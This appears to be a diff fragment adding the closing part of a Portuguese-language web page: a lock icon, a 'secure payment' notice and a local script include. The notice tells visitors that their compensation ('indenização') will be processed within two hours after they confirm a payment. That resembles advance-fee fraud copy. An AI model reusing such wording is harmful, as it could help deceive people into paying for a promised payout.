+            <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd">
+
+        </path>
+        </svg>
+            <div>
+            <h4 class="font-semibold text-gray-800 text-sm mb-1">Pagamento Seguro</h4>
+            <p class="text-gray-600 text-xs">Você será redirecionado para uma plataforma de pagamento segura. Após a confirmação, sua indenização será processada em até 2 horas úteis.</p>
+        </div>
+    </div>
+    </div>
+    </div>
+</div></div></div>
+
+    </main>
+</div>
+
+
+
+<script src="./assets/js/functions.js"></script>
+
+    
+</body>
+
+</html>
+
+
+
+
+
+
+
+
+
+
